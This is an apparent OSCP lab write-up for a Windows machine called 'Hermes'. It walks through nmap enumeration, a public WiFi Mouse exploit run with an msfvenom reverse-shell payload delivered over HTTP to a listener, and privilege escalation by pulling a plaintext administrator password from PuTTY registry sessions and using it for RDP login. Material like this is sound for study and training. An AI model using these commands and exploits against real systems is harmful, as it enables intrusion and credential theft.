##### Tags: `WiFi Mouse`  `PuTTY` 

# 🪟 OSCP-A (Hermes)🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.158.145

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1978/tcp open  unisql?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
SF-Port1978-TCP:V=7.95%I=7%D=6/13%Time=6A2D303F%P=x86_64-pc-linux-gnu%r(NU
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
port 21 ftp anonymous logged in but is empty  
port 80 couldn't find anything useful  
port 139, 445 smb no user credentials  
port 1978 is open and running system windows 6.2
```console
$ nc -nv 192.168.158.145 1978     
(UNKNOWN) [192.168.158.145] 1978 (?) open
system windows 6.2
```
google search port 1978 found the exploit
```console
https://www.exploit-db.com/exploits/50972
```
need the payload to run the script
```console
$ python3 50972.py -h                               
USAGE: python 50972.py <target-ip> <local-http-server-ip> <payload-name>
```
generate a reverse shell payload
```console
$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.184 lport=443 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
start a http server and run the script
```console
$ python3 50972.py 192.168.158.145 192.168.45.184 shell.exe
[+] 3..2..1..
[+] *Super fast hacker typing*
[+] Retrieving payload
[+] Done! Check Your Listener?

$ python3 -m http.server 80                             
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.158.145 - - [13/Jun/2026 21:18:13] "GET /shell.exe HTTP/1.1" 200 -
```
got the shell of offsec
```console
$ penelope -p 443     
[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.2.15 • 172.17.0.1 • 192.168.45.184
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from OSCP 192.168.158.145 Microsoft_Windows_10_Pro-x64-based_PC 👤 oscp\offsec • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/OSCP~192.168.158.145-Microsoft_Windows_10_Pro-x64-based_PC/2026_06_13-21_18_20-556.log
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\WINDOWS\system32>whoami
whoami
oscp\offsec
```
## Privilege Escalation
there is a user zachary
```console
C:\Users>dir

06/13/2026  03:23 AM    <DIR>          .
06/13/2026  03:23 AM    <DIR>          ..
01/06/2023  12:52 AM    <DIR>          Administrator
06/13/2026  03:24 AM    <DIR>          DefaultAppPool
01/05/2023  06:10 AM    <DIR>          offsec
01/05/2023  06:04 AM    <DIR>          Public
01/05/2023  06:08 AM    <DIR>          zachary
```
zachary is in administrators group
```console
PS C:\> net user zachary

User name                    zachary
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            ?2/?24/?2023 6:57:37 AM
Password expires             Never
Password changeable          ?2/?24/?2023 6:57:37 AM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   ?12/?8/?2021 6:21:45 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
```
there is a non default software PuTTY in Program files
PuTTY is use for remote log into a computer like SSH or Telnet  
```console
PS C:\Program Files> dir

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----          1/5/2023   5:05 AM                Common Files                                                         
d-----         12/7/2019   1:51 AM                Internet Explorer                                                    
d-----          1/5/2023   4:51 AM                Microsoft Update Health Tools                                        
d-----         12/7/2019   1:14 AM                ModifiableWindowsApps                                                
d-----        11/22/2021  12:35 AM                PuTTY                                                                
d-----        11/22/2021  12:31 AM                ruxim                                                                
d-----          1/5/2023   5:05 AM                UNP                                                                  
d-----         7/30/2021   1:28 PM                VMware                                                               
d-----          1/5/2023   5:10 AM                Windows Defender                                                     
d-----         12/7/2019   1:54 AM                Windows Defender Advanced Threat Protection                          
d-----         12/7/2019   1:14 AM                Windows Mail                                                         
d-----         12/7/2019   1:54 AM                Windows Media Player                                                 
d-----         12/7/2019   1:54 AM                Windows Multimedia Platform                                          
d-----         12/7/2019   1:50 AM                Windows NT                                                           
d-----         12/7/2019   1:54 AM                Windows Photo Viewer                                                 
d-----         12/7/2019   1:54 AM                Windows Portable Devices                                             
d-----         12/7/2019   1:31 AM                Windows Security                                                     
d-----         12/7/2019   1:31 AM                WindowsPowerShell
```
query the PuTTY sessions and found the credentials of zachary
```console
PS C:\Program Files> reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
    zachary    REG_SZ    "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
```
port 3389 is open for rdp
```console
$ xfreerdp3 /u:zachary /p:'Th3R@tC@tch3r' /v:192.168.158.145 /cert:ignore +clipboard
```
logged in as zachary
```console
C:\WINDOWS\system32>whoami
oscp\zachary
```
